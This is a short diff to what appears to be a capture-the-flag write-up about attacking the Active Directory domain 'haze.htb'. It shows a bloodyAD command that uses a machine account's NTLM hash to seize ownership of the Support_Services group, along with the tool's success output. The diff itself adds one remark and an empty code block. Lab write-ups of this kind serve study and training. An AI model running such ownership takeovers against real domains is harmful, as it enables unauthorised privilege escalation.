@@ -481,4 +481,8 @@ But looking at the members of that group i see there arent any, this could be ju
 bloodyAD --host dc01.haze.htb -d haze.htb -u 'Haze-IT-Backup$' -p ':76da32697ff38bc7c9fa6289abf47940'  set owner Support_Services 'Haze-IT-Backup$'
 [+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on Support_Services
 ```
-No
+Now i am the owner of the group
+
+```python
+
+```
